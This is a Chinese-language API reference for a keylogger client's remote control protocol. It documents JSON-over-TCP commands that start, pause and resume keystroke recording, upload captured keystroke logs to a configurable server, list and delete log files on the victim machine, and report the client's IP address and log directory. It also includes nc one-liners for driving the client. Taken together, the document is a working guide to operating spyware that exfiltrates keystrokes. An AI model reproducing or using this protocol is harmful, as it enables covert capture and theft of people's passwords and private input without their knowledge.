# Keylogger API 文档

## 概述

本文档详细描述了 Keylogger 客户端支持的所有 API 命令，用于服务器端与客户端之间的通信。

## 通信协议

- **通信方式**：TCP 连接
- **端口**：客户端默认监听 9999 端口（可自动切换）
- **数据格式**：JSON 格式，以换行符 `\n` 结束
- **编码**：UTF-8

## 基本请求格式

```json
{"action": "命令名称", "参数1": "值1", "参数2": "值2"}
```

## 基本响应格式

### 成功响应
```json
{
  "status": "ok",
  "type": "响应类型",
  "data": {
    "键1": "值1",
    "键2": "值2"
  }
}
```

### 错误响应
```json
{
  "status": "error",
  "message": "错误信息"
}
```

## API 命令列表

### 1. 心跳检测

**命令**：`ping`

**功能**：检测客户端是否在线，获取基本状态

**请求格式**：
```json
{"action": "ping"}
```

**响应格式**：
```json
{
  "status": "ok",
  "type": "pong",
  "data": {
    "recording": true,
    "upload_enabled": false,
    "local_port": 9999,
    "ip": "192.168.1.100"
  }
}
```

### 2. 开始定时上传

**命令**：`start_upload`

**功能**：启动定时上传线程，每 5 分钟上传一次最新日志

**请求格式**：
```json
{"action": "start_upload"}
```

**响应格式**：
```json
{
  "status": "ok",
  "type": "upload_started"
}
```

### 3. 停止上传

**命令**：`stop_upload`

**功能**：停止定时上传

**请求格式**：
```json
{"action": "stop_upload"}
```

**响应格式**：
```json
{
  "status": "ok",
  "type": "upload_stopped"
}
```

### 4. 立即上传

**命令**：`upload_once`

**功能**：立即上传最新的 N 个日志文件

**请求格式**：
```json
{"action": "upload_once", "count": 3}
```

**参数**：
- `count`：上传文件数量（默认：1，可选）

**响应格式**：
```json
{
  "status": "ok",
  "type": "upload_completed",
  "data": {
    "uploaded_count": 3
  }
}
```

### 5. 获取日志文件信息

**命令**：`get_logs_info`

**功能**：获取客户端日志文件的详细信息

**请求格式**：
```json
{"action": "get_logs_info"}
```

**响应格式**：
```json
{
  "status": "ok",
  "type": "logs_info",
  "data": {
    "total_count": 5,
    "total_size": 1024567,
    "files": [
      {
        "name": "192.168.1.100_20250401.log",
        "date": "20250401",
        "size": 204800
      },
      {
        "name": "192.168.1.100_20250331.log",
        "date": "20250331",
        "size": 189567
      }
    ]
  }
}
```

**字段说明**：
- `total_count`：日志文件总数
- `total_size`：所有日志文件总大小（字节）
- `files`：文件列表（按日期降序排列）
- `files[].name`：文件名
- `files[].date`：日期（YYYYMMDD 格式）
- `files[].size`：文件大小（字节）

### 6. 删除指定日志

**命令**：`delete_log`

**功能**：删除指定的日志文件

**请求格式**：
```json
{"action": "delete_log", "file": "192.168.1.100_20250401.log"}
```

**参数**：
- `file`：要删除的文件名（必须是 `IP_YYYYMMDD.log` 格式）

**响应格式**：
```json
{
  "status": "ok",
  "type": "log_deleted",
  "data": {
    "success": true,
    "file": "192.168.1.100_20250401.log"
  }
}
```

### 7. 暂停录制

**命令**：`pause_record`

**功能**：暂停键盘录制

**请求格式**：
```json
{"action": "pause_record"}
```

**响应格式**：
```json
{
  "status": "ok",
  "type": "record_paused"
}
```

### 8. 恢复录制

**命令**：`resume_record`

**功能**：恢复键盘录制

**请求格式**：
```json
{"action": "resume_record"}
```

**响应格式**：
```json
{
  "status": "ok",
  "type": "record_resumed"
}
```

### 9. 获取完整状态

**命令**：`get_status`

**功能**：获取客户端的完整状态信息

**请求格式**：
```json
{"action": "get_status"}
```

**响应格式**：
```json
{
  "status": "ok",
  "type": "status",
  "data": {
    "recording": true,
    "upload_enabled": false,
    "local_port": 9999,
    "ip": "192.168.1.100",
    "log_dir": "C:\\Users\\Username\\AppData\\Roaming\\Keylogger"
  }
}
```

### 10. 设置服务器地址

**命令**：`set_server`

**功能**：修改上传服务器的地址和端口

**请求格式**：
```json
{"action": "set_server", "host": "10.88.202.59", "port": 5244}
```

**参数**：
- `host`：服务器 IP 地址（可选）
- `port`：服务器端口（可选）

**响应格式**：
```json
{
  "status": "ok",
  "type": "server_configured",
  "data": {
    "host": "10.88.202.59",
    "port": 5244
  }
}
```

## 使用示例

### 示例 1：连接测试

```bash
# 使用 nc 命令测试连接
echo '{"action":"ping"}' | nc 192.168.1.100 9999
```

### 示例 2：获取日志信息

```bash
echo '{"action":"get_logs_info"}' | nc 192.168.1.100 9999
```

### 示例 3：上传 3 个最新日志

```bash
echo '{"action":"upload_once","count":3}' | nc 192.168.1.100 9999
```

### 示例 4：删除指定日志

```bash
echo '{"action":"delete_log","file":"192.168.1.100_20250401.log"}' | nc 192.168.1.100 9999
```

## 错误处理

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `unknown action` | 命令不存在 | 检查命令名称是否正确 |
| `Missing 'file' parameter` | 缺少必要参数 | 提供正确的参数 |
| `Invalid log file name` | 文件名格式错误 | 使用正确的 `IP_YYYYMMDD.log` 格式 |
| `Log file not found` | 文件不存在 | 检查文件名是否正确 |
| 其他错误 | 网络问题或客户端异常 | 检查网络连接和客户端状态 |

## 注意事项

1. **安全性**：API 通信未加密，建议在安全网络环境中使用
2. **权限**：删除操作需要文件系统权限
3. **稳定性**：长时间运行可能会占用系统资源
4. **日志格式**：只处理 `IP_YYYYMMDD.log` 格式的日志文件
5. **错误重试**：网络错误时建议实现重试机制

## 版本历史

| 版本 | 变更内容 | 日期 |
|------|----------|------|
| 1.0 | 初始版本 | 2025-04-17 |
| 1.1 | 添加 `upload_once` 支持 `count` 参数 | 2025-04-17 |
| 1.2 | 添加 `get_logs_info` 和 `delete_log` 命令 | 2025-04-17 |
